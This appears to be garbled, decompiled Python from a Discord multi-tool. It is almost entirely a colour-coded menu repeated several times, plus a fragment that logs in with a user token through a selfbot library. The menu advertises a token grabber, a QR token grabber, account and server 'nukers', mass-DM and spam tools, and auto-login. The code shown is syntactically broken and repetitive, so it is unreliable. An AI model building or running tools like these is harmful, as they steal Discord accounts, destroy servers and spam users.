'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['[']
            []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']
            []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}''']
            bot = discum.Client(firstline, **('token',))
            
            def close_after_fetching(resp = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   